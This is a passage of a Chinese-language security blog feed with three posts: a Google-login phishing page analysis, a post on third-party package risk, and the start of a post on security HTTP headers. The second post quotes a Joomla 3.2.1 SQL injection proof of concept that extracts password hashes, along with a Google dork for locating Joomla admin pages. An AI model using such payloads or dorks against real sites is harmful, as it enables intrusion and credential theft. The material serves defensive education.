  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkConnection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkConnection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;youtube:424:1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkedDomains&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkedDomains&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;youtube&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden-label&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Email&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;spellcheck=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden-label&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signIn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signIn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rc-button rc-button-submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sign in&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;發現了嗎？其中 form 的 action 欄位被取代成「&lt;strong&gt;http://cantonfair.a78.org/yahoo/post.php&lt;/strong&gt;」，而這個頁面會直接接收受害者輸入的帳號密碼，並且自動跳轉到真正的 Google 登入頁面。攻擊者從 a78.org 這個網站中直接取得所有被駭的人輸入的帳號密碼。&lt;/p&gt;

&lt;p&gt;這是一個很簡單、典型、又易被發現的釣魚案例。如果一時不察不小心輸入了帳號密碼，下次帳號被盜的就是自己。建議大家在收取信件的時候遵循幾大原則：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不隨便開啟附加檔案：附件常夾帶惡意程式、執行檔、惡意文件、釣魚網頁等，切勿隨便開啟。可使用 Google Docs 開啟附件文件防止惡意文件攻擊 Adobe PDF Reader、Microsoft Office 等程式。更常有把惡意程式加密壓縮後寄出，在信中附上密碼，借此規避防毒軟體的偵測，不可不慎。&lt;/li&gt;
  &lt;li&gt;注意信件中的超連結 URL：釣魚信件常在超連結中使用惡意網站的 URL，在點選之前務必仔細檢查，更要小心「Goog&lt;strong&gt;l&lt;/strong&gt;e」及「Goog&lt;strong&gt;1&lt;/strong&gt;e」之類的英文數字差異。&lt;/li&gt;
  &lt;li&gt;注意信件中的語氣：有的時候攻擊者仿冒你身邊可信任的人寄信給你，但是語氣、用詞要非常精準。如果出現了「&lt;strong&gt;尊敬的用戶您好&lt;/strong&gt;」你就會發現這個應該不太像是台灣本土的信件用語。&lt;/li&gt;
  &lt;li&gt;不在信件中夾帶機敏資料：信件是不安全的，切勿在信中提到帳號、密碼、個資等機密資料。&lt;/li&gt;
  &lt;li&gt;不回應陌生郵件：郵件中會夾帶自己的 IP 位址，回應信件可能讓攻擊者得到這些資料。&lt;/li&gt;
  &lt;li&gt;使用安全的郵件軟體：若使用安全的郵件軟體、平台，例如 Gmail，遇到惡意郵件時，會即時阻擋並且警告用戶。如果使用自己的郵件軟體，就要特別注意釣魚等攻擊。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;電子郵件的攻擊已經成為滲透攻擊主要的手法之一，不少國際資安事件都是肇因於惡意郵件。例如 2013 年韓國 DarkSeoul 事件，以及竄改交易匯款資料郵件詐取匯款等。身為目標的我們更要時時注意使用電子郵件時的安全事項。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/</link>
                <guid>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</guid>
                <pubDate>Mon, 31 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>使用第三方套件所要擔負的資安風險</title>
                <description>&lt;p&gt;使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。&lt;/p&gt;

&lt;p&gt;在服務眾多客戶之後，我們深知這些問題的嚴重性。以下我們將就幾個經典的案例來說明使用第三方套件所要擔負的風險，並且分享我們對於第三方套件的安全建議。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;程式碼的安全性&quot;&gt;程式碼的安全性？&lt;/h3&gt;

&lt;p&gt;程式碼的品質直接決定了系統的安全性。如果一個套件有以下幾點因素：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;程式開發已久難以修改&lt;/li&gt;
  &lt;li&gt;開發人員無安全觀念&lt;/li&gt;
  &lt;li&gt;大量整合外部套件，無法控管每個套件安全&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;可能就因為程式碼難以修改，形成漏洞百出的程式架構。若是之後陸續發生安全問題，儘管不斷的修補漏洞，但卻會因為程式碼的設計、架構等因素，造成日後依舊陸續有安全疑慮。&lt;/p&gt;

&lt;h3 id=&quot;案例說明dedecms&quot;&gt;案例說明：DedeCMS&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; 是知名的內容管理系統，不少公司拿此套件架設網站、部落格等。但在這幾個月，在「&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲平台&lt;/a&gt;」上陸續有人揭露 DedeCMS 的漏洞。包括大量各種 SQL Injection、Cross-Site Scripting 弱點等等，甚至還包括 Command Execution 問題。如果沒有即時修正這些問題，小則造成用戶帳號被盜，大則造成整台主機被入侵，取得作業系統權限。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot; alt=&quot;烏雲漏洞報告平台&quot; title=&quot;烏雲漏洞報告平台&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;什麼系統沒被找到漏洞過呢？有那麼嚴重嗎？但該系統已經不只一次出現重大漏洞導致企業遭到入侵，在今年一二月份更是遭揭露多達十數個高風險 SQL Injection 資料庫注入漏洞。此現象凸顯該套件的設計並未經過安全測試，並且採用不安全的程式撰寫方式，未來可能會有更多隱含的漏洞釋出。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在平台中搜尋關鍵字「DedeCMS」，會發現漏洞提報的次數相當多，在漏洞的評論中也有不少技術人員進行討論。但更多的疑惑是為什麼 DedeCMS 會一再的發生資安問題。例如以下漏洞：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-052010&quot;&gt;Dedecms某命令執行漏洞&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051950&quot;&gt;DedeCMS全版本通殺SQL注入(真正的無任何限制附官方測試結果)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051889&quot;&gt;DedeCMS全版本通殺SQL注入(無任何限制)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;Dedecms某命令执行漏洞（续）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;而於另一個「&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug 安全漏洞信息庫&lt;/a&gt;」也可以看到不少 DedeCMS 的蹤影。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot; alt=&quot;sebug安全漏洞信息庫&quot; title=&quot;sebug安全漏洞信息庫&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果官方在第一時間就能接獲通報、了解問題並修正解決，提供更新程式給客戶更新，那安全的風險會小些。但在官方尚未釋出更新的這段時間，網站將完全的暴露在風險當中。有心人士看到套件的漏洞陸續被揭露，也會更有興趣尋找使用該套件的網站攻擊。&lt;/p&gt;

&lt;h3 id=&quot;案例說明joomla&quot;&gt;案例說明：Joomla!&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt; 是另一套國際非常知名的 CMS 系統，因為其便利性，很多企業、學校、政府單位，都採用此套件建立網站。透過 Google Hacking 方式可以找到台灣非常多網站都使用 Joomla! 架站。&lt;/p&gt;

&lt;pre&gt;
site:tw intitle:管理區 inurl:administrator
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking 尋找 Joomla!&quot; title=&quot;Google Hacking 尋找 Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但是如果今天這個系統出了問題呢？「Joomla!」因為外掛、套件眾多，也經常成為漏洞發掘的對象。在 2014/02/05，國外釋出了一個 SQL Injection Exploit，可以導致網站帳號密碼直接被導出。&lt;/p&gt;

&lt;p&gt;官方安全公告：&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Secunia: Joomla! Multiple Vulnerabilities &lt;a href=&quot;http://secunia.com/advisories/56772/&quot;&gt;http://secunia.com/advisories/56772/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploit 位址：&lt;a href=&quot;http://www.exploit-db.com/exploits/31459/&quot;&gt;http://www.exploit-db.com/exploits/31459/&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=&amp;gt;
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
 
will cause an error:
 
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\)&apos; at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = &apos;com_weblinks.categories&apos; AND `m`.`content_item_id` IN ( \) Array ( [type] =&amp;gt; 8 [message] =&amp;gt; Undefined offset: 0 [file] =&amp;gt; /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] =&amp;gt; 203 )
 
I modified the original error.php file with this code --- &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php print_r(error_get_last()); ?&amp;gt;&lt;/span&gt; --- in order to obtain something useful. ;-)
 
Now i can easily exploit this flaw:
 
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
 
1054 Unknown column &apos;$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1&apos; in &apos;where clause&apos; SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` &lt;span class=&quot;nt&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` &lt;span class=&quot;nt&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &apos;com_weblinks.categories&apos;) AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
 
CheerZ&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;值得注意一看的是&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;官方公告&lt;/a&gt;，上面標註著漏洞回報時間以及修補時間。2014/2/6 接獲回報，2014/3/6 修復。在這整整一個月的時間之內，所有適用版本內的 Joomla! 網站都將受此漏洞影響。因此套件廠商的反應修復速度越慢，顧客暴露在風險之中的時間越長。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;案例說明外包廠商&quot;&gt;案例說明：外包廠商&lt;/h3&gt;

&lt;iframe src=&quot;//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=&quot; width=&quot;507&quot; height=&quot;406&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt; &lt;/iframe&gt;

&lt;p&gt;這樣的情境你是否熟悉？&lt;/p&gt;

&lt;p&gt;公司有一套客製化的系統需要建置，但是因為公司內部開發人員不足，因此把這個系統外包出去給廠商做。貨比三家不吃虧，比了 A B C 三家，發現 A 家最便宜實惠，交貨時間又短。決定就把這個系統發包給 A 廠商做。半年過去了，這個廠商順利交貨結案。&lt;/p&gt;

&lt;p&gt;一年過後，發現這個系統竟然遭到入侵，主動攻擊內部其他伺服器。「不是有買防火牆嗎？怎麼還會被入侵？」老闆說。這可嚴重了，馬上找廠商來刮一頓。沒想到，A 廠商表示，該案已經順利結案，維護期也已經過了，沒辦法提供協助，除非繼續簽訂維護合約。問題總得解決，簽訂了維護合約之後，A 廠商也協助把病毒砍掉了。圓滿結束？事情有那麼簡單嗎？&lt;/p&gt;

&lt;p&gt;過了兩天，系統又開始攻擊其他伺服器。「病毒不是已經砍掉了嗎？」老闆說。問題在哪大家應該都很清楚。在尋找資安廠商協助之下，發現主機是因為 A 廠商設計的系統含有漏洞，導致 SQL Injection 問題，遭攻擊者利用植入惡意程式。A 廠商百般無奈，摸摸鼻子把這個漏洞修補起來。又過了兩天，再度遭到入侵。看了看，發現又是另一個 SQL Injection 問題。在幾次與攻擊者的不斷角力之下，終於好像把問題都修完了。&lt;/p&gt;

&lt;p&gt;過了一週，系統再度有惡意程式的蹤跡，A 廠商也無能為力。資安廠商表示，買這個就對了！在陸續被迫買了防火牆、WAF、IDS 等設備後，雖然問題貌似改善，但系統仍然零星有入侵事件發生。公司只好「斷然處置」，等待下次預算，另請廠商重新開發系統。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 1：該系統是否還有其他漏洞？&lt;/li&gt;
  &lt;li&gt;問題 2：公司的處置是否正確？&lt;/li&gt;
  &lt;li&gt;問題 3：A 廠商的其他客戶是否有類似的問題？&lt;/li&gt;
  &lt;li&gt;問題 4：不是有買資安設備？為什麼還會有資安事件？&lt;/li&gt;
  &lt;li&gt;問題 5：公司該如何自保？&lt;/li&gt;
  &lt;li&gt;問題 6：廠商該如何自保？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想一下以上各點問題。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 1：該系統是否還有其他漏洞？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果一個在開發時期就沒有注意安全的系統，很有可能有更多不為人知的漏洞。如果被動依賴資安事件，發生一件修一個漏洞，那是永無止盡的。正確的方式應該是直接針對 A 廠商的原始碼進行黑箱&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;、白箱源碼檢測 (Code Review)，才能快速找出所有風險。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 2：公司的處置是否正確？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「貨比三家不吃虧」，節儉確實是美德，但是在資訊產業中，越便宜的系統可能代表著更多的 cost down，除了犧牲掉品質之外，可能帶給企業更多損失。在資安事件發生時，一定要找原本維運廠商負責，並且與資安顧問公司配合，協助廠商把問題解決。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 3：A 廠商的其他客戶是否有類似的問題？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;羅馬不是一日造成的，不安全的系統也不是一個漏洞造成的。廠商通常是做出一份系統，客製化販賣給不同的企業用戶。如果在建置的過程中沒有注意安全問題，今天這家客戶有這個漏洞，別的客戶一定也會有。因此如果採用了不良的廠商實作的系統，下一個被駭的可能就是自己。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 4：不是有買資安設備？為什麼還會有資安事件？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「不是有買防火牆嗎？怎麼還會被入侵？」是很多傳統思維企業的共同心聲。防火牆不是萬靈丹，駭客也絕對不是電腦。並不是完全依賴資安設備就能夠避免資安問題。在駭客的手法中，更多是如何繞過各種防禦設備手段，甚至有些資安設備本身竟然含有資安弱點，企業反而因為資安設備導致系統被入侵。&lt;/p&gt;

&lt;p&gt;正確的思維應該是從人開始做起，建立正確的資安觀念、資安思維，學習駭客的思維。建立正確的系統開發流程、建立正確的資安事件處理流程。尋找信譽良好的資安顧問廠商，定期針對企業內部各系統進行滲透測試、弱點掃描。安全的建立絕非一蹴可及，唯有一步步踏穩才能走得更遠。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 5：公司該如何自保？&lt;/li&gt;
  &lt;li&gt;問題 6：廠商該如何自保？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;請看下一個章節「建議對策」。&lt;/p&gt;

&lt;h3 id=&quot;建議對策&quot;&gt;建議對策&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/26604430@N05/5895021311/&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_cover.png&quot; alt=&quot;Countermeasure&quot; title=&quot;Countermeasure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一個安全的系統，絕對是由基礎建設開始，每個環節都兼顧到安全的設計，並且定期稽核程式碼安全，使用正確安全的方式開發。如果系統開發初期就沒有兼顧安全，後期不管怎麼修補，都還是會有漏洞讓攻擊者有機可趁。&lt;/p&gt;

&lt;p&gt;企業該如何自保？使用 OpenSource 第三方套件或者是系統委外開發，是企業無可避免的。如果是第三方套件，平時可以多加注意套件的資安消息，如果一有新的漏洞被發現，將可以在第一時間應變。若沒有足夠人力密切注意資安消息，也可以委請資安顧問廠商協助，在得知資安消息的第一時間通報企業。委外開發的系統，企業可以要求廠商提出專業公正第三方資安公司進行檢測，並且提出安全報告，證明該系統有經過滲透測試等安全檢測，保障雙方的權利。&lt;/p&gt;

&lt;p&gt;如果系統已經被入侵了，或者是被揭露了安全漏洞，該如何自保呢？在漏洞大量揭露的情況下，系統更會成為攻擊者的目標。因此要務必密切注意使用該套件的伺服器狀況，並且遵循以下原則：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;密切注意官方的更新程式並立即更新&lt;/li&gt;
  &lt;li&gt;此台伺服器的帳號密碼切勿與他台共用&lt;/li&gt;
  &lt;li&gt;將此台伺服器與其他伺服器隔離，避免遭入侵時受害範圍擴大&lt;/li&gt;
  &lt;li&gt;異地備份伺服器的系統記錄，並定時檢閱記錄，觀察是否有可疑行為&lt;/li&gt;
  &lt;li&gt;考慮採用 Web Application Firewall (WAF)、ModSecurity 伺服器安全模組，增加攻擊難度&lt;/li&gt;
  &lt;li&gt;重新評估使用遭入侵套件的必要性以及安全考量，避免成為企業的隱含風險&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用第三方套件加速開發節省成本的同時，務必也要考慮安全的問題，才不會因小失大，造成企業更大的損失。同時企業也必須增加資安的素養以及了解攻擊者的思維，別讓自己的企業成為下一個資安事件報導的對象。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues/</link>
                <guid>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues</guid>
                <pubDate>Fri, 14 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Headers 的資安議題 (1)</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;隨著駭客攻擊事件日益漸增，原本經常被大眾所忽視的網站資安問題，現在已經逐漸受到重視。但是，許多企業主或開發人員雖然很想強化網站的安全性，卻不知道該如何從何著手。&lt;/p&gt;

&lt;p&gt;企業主通常想到的改善方案是添購資安設備，希望可以一勞永逸。我們姑且先不談「&lt;strong&gt;資訊界沒有永遠的安全&lt;/strong&gt;」這件事，企業光是要買到有效的資安設備就是一件令人頭痛的事情，不但要花許多時間聽取廠商的簡報，耗費大筆的經費採購，購買之後還要請員工或原廠技術人員協助調校、設定或教學，否則買了等於沒買。&lt;/p&gt;

&lt;p&gt;而對於技術人員來說，若要強化網站安全性，必須先了解駭客如何攻擊，才知道如何建立根本性的防禦機制。但是企業主通常捨不得送員工去參加專業的教育訓練，台灣員工拿的 22k 低薪也低得常常令人捨不得花錢去上課。&lt;/p&gt;

&lt;p&gt;如果有一種方式可以增強網站的基本安全性，而且不需要花大錢，又可以讓開發人員不用大幅度變更程式，應該是個皆大歡喜的方案？&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;究竟有沒有低成本的簡易防禦方法&quot;&gt;究竟有沒有低成本的簡易防禦方法？&lt;/h3&gt;

&lt;p&gt;有的！目前各家瀏覽器 (Google Chrome、Firefox、Safari、IE) 其實已經支援許多種資安相關的 HTTP headers。開發人員若在伺服器設定加入某些 headers，瀏覽器收到 response 時就會執行相對應的防禦機制，如此一來可直接提升網頁應用程式的基本安全性。這些 HTTP headers 通常也已被許多常見的 framework 納入爲基本功能，即使開發人員不清楚如何修改伺服器相關設定，也可以依靠 framework 提供的方式來使用這些 headers。因此使用這些 headers 來提升網站安全性就成爲頗具 CP 值的方式。&lt;/p&gt;

&lt;p&gt;目前最常見的資安相關 HTTP headers 可參考 &lt;a href=&quot;https://www.owasp.org/index.php/List_of_useful_HTTP_headers&quot;&gt;OWASP 網站&lt;/a&gt; 所條列的內容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy (X-Content-Security-Policy、X-Webkit-CSP 都是同一系列)&lt;/li&gt;
  &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
  &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
  &lt;li&gt;X-Frame-Options&lt;/li&gt;
  &lt;li&gt;X-XSS-Protection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;還有一些其他的資安相關 HTTP headers 也值得注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access-Control-Allow-Origin&lt;/li&gt;
  &lt;li&gt;X-Download-Options&lt;/li&gt;
  &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最後有一項比較特別的是 Cookie 的安全設定，由於 Cookie 也是 HTTP headers 的一部份，因此本文也將其列出：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
  &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上述 headers 的數量是不是稍微超過你的想像？其實這些技術早已被很多大公司採用，像是 Google、Facebook、Twitter 等常見的網路服務都可看到這些 headers 的蹤影。下面這張圖片使用 Chrome 的 Inspector 來觀察 Twitter 的 HTTP response 內容：&lt;/p&gt;

